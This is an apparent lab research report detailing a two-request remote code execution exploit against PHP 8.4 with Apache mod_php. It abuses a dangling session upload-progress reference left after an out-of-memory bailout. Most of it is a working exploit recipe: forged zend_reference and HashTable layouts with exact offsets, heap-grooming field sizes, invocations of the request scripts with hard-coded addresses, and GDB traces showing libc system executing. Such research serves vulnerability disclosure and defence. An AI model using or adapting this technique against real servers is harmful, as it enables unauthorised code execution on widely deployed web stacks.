# no-ASLR RCE Report: Pure HTTP, No Target-Side PHP

Date: 2026-10-21
Target: PHP 8.4.26 + Apache 2.4.68 prefork + mod_php (Debian 12 amd64 remote lab)
Constraints: **Fully remote, HTTP only, with no target-specific PHP files written to the target webroot.** The target page is the ordinary `index.php`:

~~~php
<?php
echo "OK\n";
~~~

This report covers **no-ASLR** results only. Analysis of the two ASLR paths is in [ASLR_PATHS.md](ASLR_PATHS.md).

---

## 1. Result

RCE was achieved on a lab worker with ASLR disabled using **two HTTP requests**:

- Request A OOMs while `session.upload_progress` decodes a large session, leaving a dangling `PS(http_session_vars)` zend_reference across requests.
- In request B, a 56-byte raw buffer allocated and freed for a multipart field reclaims the old reference's block, overwriting the old 32-byte reference with a fake `zend_reference`. A **live** 192-byte zend_string carries the fake HashTable. During B's END cleanup, `php_session_track_init()` → `zval_ptr_dtor` → `zend_array_destroy` → `zend_hash_destroy` calls libc `system` through `pDestructor`.

Observed command:

~~~text
system("id>/tmp/p1")
~~~

Proof file (`/tmp/p1`, 54 bytes):

~~~text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
~~~

Key GDB backtrace:

~~~text
#0  __libc_system (line=0x7ffff5e6e118 "id>/tmp/p1")
#1  zend_hash_destroy (ht=0x7ffff5e6e0d8)
#2  zend_array_destroy (ht=0x7ffff5e6e0d8)
#3  i_zval_ptr_dtor (zval_ptr=0x7ffff5e02328)
#4  zend_reference_destroy (ref=0x7ffff5e02320)
#5  php_session_track_init ()
#6  php_session_initialize ()
#7  php_session_rfc1867_cleanup ()
#8  php_session_rfc1867_callback ()
~~~

After `system` returns, the request aborts in Zend MM (`zend_mm_realloc_heap` detects heap inconsistency), but the command has already run and written the proof. The worker then crashes, as expected for this one-shot exploit.

---

## 2. Root Cause and Trigger

- Vulnerable path: the upload-progress path in `ext/session/session.c`.
- Request A OOMs while decoding a large session through `session.upload_progress` during `php_request_startup`. After bailout, `modules_activated=0`, so session RSHUTDOWN is skipped.
- Leftover state: `PS(http_session_vars)` is a **zend_reference** whose `val.value` points to the session HashTable allocated in A. After A ends, B's `php_session_track_init()` still accesses that reference.
- B's END cleanup calls `php_session_initialize()` → `php_session_track_init()`:
  1. `zend_delete_global_variable("_SESSION")` decreases the reference count from 2 to 1.
  2. `zval_ptr_dtor(&PS(http_session_vars))` sees count 1 and calls `zend_reference_destroy()`.
  3. `zend_reference_destroy()` calls `zend_array_destroy()` on `ref->val`, which we forged as IS_ARRAY.
  4. The fake HashTable has `pDestructor = system`; `zend_hash_destroy()` calls `system()` with `&bucket->val` as the command string.

The trigger runs before application code and does not require the application to call any session API.

---

## 3. Request B Memory Layout

Stable addresses with ASLR disabled:

| Object | Address/offset |
|---|---|
| Old dangling zend_reference R0 | `0x7ffff5e02320` |
| Start of 56-byte raw buffer reclaiming R0 | `R0-0x10` |
| Data of the live 192-byte zend_string holding fake HashTable | `0x7ffff5e6e0d8` (T+0x18) |
| libc `system` | `0x7ffff7d13490` |
| libphp base (reference) | `0x7ffff47c0000` |

### 3.1 Raw Buffer Reclaims the Old Reference

A normal multipart field value is read by `multipart_buffer_read_body()` into a **raw buffer** from `erealloc(NULL, len+1)`. The callback/registration happens before `efree()`; the contents remain after release. Choose a field value of length 55 (56-byte allocation, Zend MM bin 6).

In B, seven priming fields with 31-character names and L=47 consume 56-byte key slots, causing the later L=55 field's raw buffer to land at `0x7ffff5e02310` (`R0-0x10`). Its 56 bytes cover the old 32-byte reference at R0:

~~~text
raw+0x10 (R0+0x00): gc: refcount=1, type=IS_REFERENCE (10)
raw+0x18 (R0+0x08): val.value = fake HashTable data address
raw+0x20 (R0+0x10): val.type  = 0x307 (IS_ARRAY_EX)
raw+0x28 (R0+0x18): zend_reference.sources = 0
~~~

`zend_reference_destroy()` requires `sources.ptr == NULL`; otherwise, the release build's `ZEND_ASSUME` causes `__builtin_unreachable`/abort.

### 3.2 A Live String Holds the Fake HashTable

A freed raw buffer cannot hold the fake HashTable: after release, the allocator writes `next_free_slot` at block offset 0, overwriting the fake HashTable's `gc`. Then `GC_DELREF` in `i_zval_ptr_dtor` does not reach zero, so the array destructor is not called.

Use a **live zend_string** instead:

- A field value of length 167 gives `zend_string_alloc` a total size of 24+167+1=192 bytes, exactly Zend MM bin 13 (192B).
- The string remains in `$_POST` through request shutdown and is still live during B's END cleanup.
- String data begins 24 bytes from the block start, and the field value controls its contents.
- Place the fake HashTable directly at data offset 0:

~~~text
data+0x00: gc refcount=1, type=IS_ARRAY (7)
data+0x08: flags=HASH_FLAG_STATIC_KEYS(16), nTableMask=0xfffffff8
data+0x10: arData = data+0x40
data+0x18: nNumUsed=1, nNumOfElements=1
data+0x20: nTableSize=8, nInternalPointer=0
data+0x28: nNextFreeElement=0
data+0x30: pDestructor = system
data+0x40: "id>/tmp/p1\0"
data+0x60: marker 0x1122334455667788 (debugging only)
~~~

`zend_hash_destroy()` takes the `HT_HAS_STATIC_KEYS_ONLY` + `HT_IS_WITHOUT_HOLES` branch and calls `pDestructor(&p->val)`, which is `system(data+0x40)`.

---

## 4. Reproduction

Environment:

- One Apache prefork worker, started with ASLR disabled:
  `setarch $(uname -m) -R /usr/sbin/apache2ctl -k start`
- PHP settings: `memory_limit=8M`, `session.upload_progress.cleanup=On`, `session.upload_progress.enabled=On`, `session.save_path=/tmp`, `session.use_strict_mode=0`, and `display_errors=On`.
- The webroot contains only the ordinary `index.php` (`echo "OK\n"`, with no session calls).

Request A (tool `send_a_ps.py` in the working directory):

~~~bash
python3 send_a_ps.py 17 19 3 12
# 17B boundary, 19B PHPSESSID, 3B progress key, 12MB large field
~~~

A OOMs while decoding upload progress and leaves a dangling reference across requests. The worker can still handle B in this lab because session RSHUTDOWN was skipped.

Request B (`send_b_rce2.py`):

~~~bash
python3 send_b_rce2.py \
  7 2 0x7ffff5e6e0d8 0x7ffff7d13490 "id>/tmp/p1"
# N1=7 priming fields; N2=2 fake-reference fields with L=55
# HTDATA=fake HashTable data address; SYS=system address
~~~

B's multipart body contains:

- `PHPSESSID=attacksessionid0001`
- `PHP_SESSION_UPLOAD_PROGRESS=pwn`
- Seven fields with 31-character names (`a000...`), each holding the 167-byte fake HashTable
- Two fields with short names (`f00`, `f01`), each holding the 55-byte fake reference
- A 10-character `B` boundary with a normal closing marker

Check the result:

~~~bash
cat /tmp/p1
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
~~~

### 4.1 Key GDB Breakpoints

~~~gdb
b php_session_track_init
# Print ps_globals.http_session_vars.value.ptr and the fake reference it points to
b zend_reference_destroy if $rdi == 0x7ffff5e02320
b zend_array_destroy   if $rdi == 0x7ffff5e6e0d8
b zend_hash_destroy    if $rdi == 0x7ffff5e6e0d8
b system
~~~

Observed hits:

~~~text
REF rdi=0x7ffff5e02320
ARR T  ht=0x7ffff5e6e0d8
HASH T ht=0x7ffff5e6e0d8
SYSTEM rdi=0x7ffff5e6e118 [id>/tmp/p1]
~~~

---

## 5. Tools and Files

| File | Purpose |
|---|---|
| `tools/send_a_ps.py` | A: OOM on a large upload-progress field, leaving a dangling reference |
| `tools/send_b_align.py` | B field length/count alignment experiments to find the 56-byte raw-buffer location |
| `tools/send_b_rce2.py` | Final B: fake reference, live-string fake HashTable, and system |
| `tools/send_b_rce.py` | Earlier version; the fake HT was in a freed raw buffer, so the free-list overwrote gc and it did not work |
| `logs/noaslr_rce.log` | GDB, system, and proof records from a successful run |

---

## 6. Limits and Scope

1. **No-ASLR only:** R0, fake HT data, and the system address are hard-coded. They change when ASLR is enabled.
2. **memory_limit:** This lab uses 8M to make A OOM easily. With the default `memory_limit=128M`, A needs to build over 128M of session data (possible, but requires high traffic). `session.upload_progress` is enabled by default, and cleanup defaults to On.
3. **Worker aborts after request B:** After `system` returns, `pefree(HT_GET_DATA_ADDR)` in `zend_hash_destroy` frees an interior string pointer. Zend MM detects the inconsistency and aborts. The proof is already written. To continue using the same process, place the fake HT in a legitimately releasable allocation or fix `nTableMask` so `HT_GET_DATA_ADDR` points to the allocation start.
4. **Exact 56B/192B allocation order in B:** N1=7, 31-character field names, L=167/L=55, and a 10-character boundary form the measured combination. Recalibrate for other PHP builds, settings, or request order.
5. **No application code required:** The target page needs no session calls; the trigger occurs during RINIT/request parsing.
